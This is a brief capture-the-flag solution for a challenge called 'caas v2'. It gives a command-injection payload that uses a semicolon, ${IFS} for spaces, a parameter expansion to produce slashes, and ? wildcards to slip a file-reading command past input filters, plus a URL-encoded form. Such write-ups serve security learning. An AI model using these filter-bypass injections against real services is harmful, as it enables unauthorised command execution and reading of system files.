# caas v2 Solution

Required outcome: `cat /etc/cowsay/*`

We utilize `${IFS}` for space, `${PWD%%[a-z]*}` for `/` and bash's `?` wildcard.

```
hi;cat${IFS}${PWD%%[a-z]*}e??${PWD%%[a-z]*}co????${PWD%%[a-z]*}*
```

After URL encoding the "?" it becomes:

```
hi;cat${IFS}${PWD%%[a-z]*}e%3F%3F${PWD%%[a-z]*}co%3F%3F%3F%3F${PWD%%[a-z]*}*
```
